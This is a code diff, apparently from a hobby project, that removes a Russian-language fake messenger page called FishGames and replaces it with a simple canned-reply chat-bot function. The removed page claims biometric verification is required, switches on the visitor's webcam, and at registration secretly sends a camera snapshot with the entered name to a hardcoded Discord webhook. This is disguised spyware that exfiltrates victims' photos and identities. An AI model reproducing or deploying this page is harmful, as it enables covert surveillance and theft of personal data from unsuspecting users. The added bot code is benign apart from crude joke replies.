@@ -1,269 +1,55 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FishGamesMesenger</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
-        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
-        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
-        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
-        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; display: none; }
-        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 10px; }
-        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
-        .messenger-container { display: flex; height: 100%; }
-        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
-        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
-        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; overflow: hidden; cursor: pointer; }
-        .avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .chat-area { flex: 1; display: flex; flex-direction: column; }
-        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
-        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
-        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
-        .input-bar { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
-        #video, #canvas { display: none; }
-    </style>
-</head>
-<body onload="checkAuth()">
+function botReply(uText) {
+    const t = uText.toLowerCase();
+    const n = currentChat.toLowerCase();
+    let r = "";
+    
+    // Проверки на ключевые слова
+    const isToxic = ["хуй", "пидор", "сука", "блять", "еблан", "чмо"].some(w => t.includes(w));
+    const isHi = ["привет", "ку", "хай", "здорово", "здравствуй"].some(w => t.includes(w));
+    const isHowAreYou = ["как дела", "как ты", "че делаешь", "как жизнь"].some(w => t.includes(w));
 
-<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>
-
-<div id="camera-overlay">
-    <div class="warning-box">
-        <h3>⚠️ FishGames SECURITY</h3>
-        <p>Биометрическая верификация лица обязательна для входа.</p>
-        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
-    </div>
-</div>
-
-<div id="reg-screen" class="reg-card">
-    <h2>FishGames</h2>
-    <input type="text" id="firstname" placeholder="Имя">
-    <input type="text" id="lastname" placeholder="Фамилия">
-    <input type="text" id="birthyear" placeholder="Год рождения">
-    <input type="text" id="login" placeholder="Логин">
-    <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
-</div>
-
-<div id="messenger-screen">
-    <div class="messenger-container">
-        <div class="sidebar">
-            <input type="text" class="search-input" id="searchField" placeholder="Поиск..." onkeypress="handleSearch(event)">
-            <div id="contacts"></div>
-            <div style="margin-top:auto; padding-top:10px; border-top:1px solid #2e8b57;">
-                <div style="display:flex; align-items:center; gap:10px;">
-                    <div class="avatar" id="my-ava" title="Сменить фото" onclick="document.getElementById('file-input').click()">?</div>
-                    <input type="file" id="file-input" style="display:none" accept="image/*" onchange="changeAvatar(this)">
-                    <div id="my-name">Вы</div>
-                    <button onclick="logout()" style="background:none; border:none; color:#ff4d4d; cursor:pointer; font-size:12px; margin-left:auto;">Удалить всё</button>
-                </div>
-            </div>
-        </div>
-        <div class="chat-area">
-            <div class="chat-header" id="chat-title">Выберите чат</div>
-            <div class="messages-display" id="chat-box"></div>
-            <div class="input-bar">
-                <input type="text" id="messageText" placeholder="Сообщение..." onkeypress="if(event.key==='Enter')sendMessage()">
-                <button class="btn" style="width:60px" onclick="sendMessage()">➤</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
-
-<script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    // Вставьте ваш рабочий вебхук здесь
-    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
-
-    const avatars = {
-        "тимофей": "https://i.redd.it/2z8x8zvo5wne1.png",
-        "богдан": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg",
-        "ярослав": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj"
+    // Наборы случайных ответов для персонажей
+    const replies = {
+        "ярослав": {
+            hi: ["Здорово. Опять отвлекаешь?", "Чё надо?", "Привет, если не шутишь."],
+            how: ["Нормально. Сижу, жду когда ты поумнеешь.", "Пойдёт. А ты чё?", "Всё ок."],
+            toxic: ["Слышь, ты че такой борзый?", "За слова ответишь?", "Адрес говори, вычислятор включен."],
+            default: ["Ясно. Забей, я занят.", "Мда, интересная (нет) история.", "Понял-принял.", "Ага, рассказывай."]
+        },
+        "богдан": {
+            hi: ["Привет! Я как раз код рефакторю.", "О, привет. Есть вопрос по Python?", "Ку."],
+            how: ["Весь в дебаггинге. Тут такая утечка памяти...", "Норм, пишу скрипт для парсинга.", "В процессе."],
+            default: ["Python — это мощь. А ты на чём пишешь?", "Интересно... А как это реализовать на JS?", "Мопс — лучший кодер, чем ты.", "Ясно. Пойду документацию почитаю."]
+        },
+        "тимофей": {
+            hi: ["ГО В РОБЛОКС!", "Привет! Зайдешь ко мне в плейс?", "Ооо, привет!"],
+            how: ["Круто! Я там новую модельку добавил.", "Норм, строю карту.", "Всё топ!"],
+            default: ["ГО В РОБЛОКС СТУДИЮ! Я там карту обновил.", "Смотри какой скрипт на Луа написал!", "Ахаха, жиза.", "Погнали играть?"]
+        },
+        "generic": ["Ясно...", "Мда...", "Жиза.", "База.", "Понятно.", "Ок.", "Ну ок.", "Бывает же такое.", "И что дальше?"]
     };
 
-    let currentChat = "";
-    let histories = {};
+    // Логика выбора персонажа
+    const char = replies[n] || { default: replies.generic };
 
-    function checkAuth() {
-        const savedUser = localStorage.getItem('fishGamesUser');
-        const savedHistories = localStorage.getItem('fishGamesHistories');
-        
-        if (savedHistories) {
-            histories = JSON.parse(savedHistories);
-            Object.keys(histories).forEach(name => {
-                renderContact(name);
-            });
-        }
-
-        if (savedUser) {
-            const user = JSON.parse(savedUser);
-            document.getElementById('camera-overlay').style.display = 'none';
-            showMessenger(user.name, user.photo);
-        }
+    // Выбор категории ответа
+    if (isToxic) {
+        r = char.toxic ? char.toxic[Math.floor(Math.random() * char.toxic.length)] : replies.generic[Math.floor(Math.random() * replies.generic.length)];
+    } else if (isHi) {
+        r = char.hi ? char.hi[Math.floor(Math.random() * char.hi.length)] : "Привет.";
+    } else if (isHowAreYou) {
+        r = char.how ? char.how[Math.floor(Math.random() * char.how.length)] : "Нормально всё.";
+    } else if (t.includes("фембой") && n === "ярослав") {
+        r = "Фембои это база, чел. Уважаю.";
+    } else if (t.includes("мопс") && n === "богдан") {
+        r = "Мопс — реально легенда кодинга.";
+    } else {
+        // Случайная фраза из личного "дефолта" персонажа
+        const def = char.default || replies.generic;
+        r = def[Math.floor(Math.random() * def.length)];
     }
-
-    async function requestAccess() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            video.srcObject = s;
-            document.getElementById('camera-overlay').style.display = 'none';
-            document.getElementById('reg-screen').style.display = 'block';
-        } catch(e) { alert("Ошибка камеры! Проверьте разрешения."); }
-    }
-
-    function register() {
-        const fn = document.getElementById('firstname').value;
-        const ln = document.getElementById('lastname').value;
-        if(!fn || !ln) return alert("Заполни всё!");
-        
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(b => {
-            const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: `📸 Вход: ${fn} ${ln}` }));
-            fd.append('file', b, 'user.png');
-            fetch(webhook, {method: 'POST', body: fd});
-        });
-
-        const userData = { name: fn, photo: null };
-        localStorage.setItem('fishGamesUser', JSON.stringify(userData));
-        showMessenger(fn, null);
-    }
-
-    function showMessenger(name, photo) {
-        document.getElementById('reg-screen').style.display = 'none';
-        document.getElementById('messenger-screen').style.display = 'block';
-        document.getElementById('my-name').innerText = name;
-        const ava = document.getElementById('my-ava');
-        if (photo) {
-            ava.innerHTML = `<img src="${photo}">`;
-            ava.style.background = "none";
-        } else {
-            ava.innerText = name[0];
-        }
-    }
-
-    function changeAvatar(input) {
-        if (input.files && input.files[0]) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const photoData = e.target.result;
-                const ava = document.getElementById('my-ava');
-                ava.innerHTML = `<img src="${photoData}">`;
-                ava.style.background = "none";
-                const user = JSON.parse(localStorage.getItem('fishGamesUser'));
-                user.photo = photoData;
-                localStorage.setItem('fishGamesUser', JSON.stringify(user));
-            };
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
-
-    function logout() {
-        if(confirm("ВНИМАНИЕ: Это полностью удалит ваш аккаунт, ВСЕ созданные контакты и историю переписки. Продолжить?")) {
-            localStorage.clear();
-            location.reload();
-        }
-    }
-
-    function handleSearch(e) {
-        if(e.key === 'Enter') {
-            const val = document.getElementById('searchField').value.trim();
-            const low = val.toLowerCase();
-            if(low === "влад") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
-            if(val && !histories[val]) {
-                histories[val] = [];
-                renderContact(val);
-                saveHistories();
-                openChat(val);
-                document.getElementById('searchField').value = '';
-            }
-        }
-    }
-
-    function renderContact(name) {
-        const low = name.toLowerCase();
-        const item = document.createElement('div');
-        item.style.cssText = "display:flex; align-items:center; gap:10px; padding:10px; cursor:pointer; border-radius:8px; transition: 0.2s;";
-        item.onmouseover = () => item.style.background = "#243b35";
-        item.onmouseout = () => item.style.background = "transparent";
-        item.onclick = () => openChat(name);
-        
-        const imgTag = avatars[low] ? `<img src="${avatars[low]}">` : name[0].toUpperCase();
-        item.innerHTML = `<div class="avatar">${imgTag}</div><div>${name}</div>`;
-        document.getElementById('contacts').appendChild(item);
-    }
-
-    function openChat(name) {
-        currentChat = name;
-        document.getElementById('chat-title').innerText = name;
-        document.getElementById('chat-box').innerHTML = '';
-        if (histories[name]) {
-            histories[name].forEach(m => renderMessage(m.text, m.type));
-        }
-    }
-
-    function renderMessage(text, type) {
-        const m = document.createElement('div');
-        m.className = 'msg-bubble ' + type;
-        m.innerText = text;
-        document.getElementById('chat-box').appendChild(m);
-        document.getElementById('chat-box').scrollTop = 999999;
-    }
-
-    function sendMessage() {
-        const txt = document.getElementById('messageText').value.trim();
-        if(!txt || !currentChat) return;
-        
-        renderMessage(txt, '');
-        histories[currentChat].push({text: txt, type: ''});
-        saveHistories();
-        
-        document.getElementById('messageText').value = '';
-        setTimeout(() => botReply(txt), 800);
-    }
-
-    function botReply(uText) {
-        const t = uText.toLowerCase();
-        const n = currentChat.toLowerCase();
-        let r = "";
-        
-        const isToxic = ["хуй", "пидор", "сука", "блять", "еблан", "чмо"].some(w => t.includes(w));
-        const isHi = ["привет", "ку", "хай", "здорово"].some(w => t.includes(w));
-
-        if(n === "ярослав") {
-            if(t.includes("фембой")) r = "Фембои это база, чел. Уважаю.";
-            else if(isToxic) r = "Слышь, ты че такой борзый? Я тебя по айпи вычислю.";
-            else if(isHi) r = "Здорово. Опять хуйню писать будешь?";
-            else r = "Ясно. Забей, я занят.";
-        } else if(n === "богдан") {
-            if(t.includes("мопс")) r = "Мопс — лучший кодер, чем ты.";
-            else r = "Я занят кодингом. Python — это мощь.";
-        } else if(n === "тимофей") {
-            r = "ГО В РОБЛОКС СТУДИЮ! Я там карту обновил.";
-        }
-
-        if(!r) {
-            const generic = ["Ясно...", "Мда...", "Жиза.", "База.", "Понятно.", "Ок."];
-            r = generic[Math.floor(Math.random()*generic.length)];
-        }
-        
-        renderMessage(r, 'msg-incoming');
-        histories[currentChat].push({text: r, type: 'msg-incoming'});
-        saveHistories();
-    }
-
-    function saveHistories() {
-        localStorage.setItem('fishGamesHistories', JSON.stringify(histories));
-    }
-</script>
-</body>
-</html>
+    
+    renderMessage(r, 'msg-incoming');
+    histories[currentChat].push({text: r, type: 'msg-incoming'});
+    saveHistories();
+}
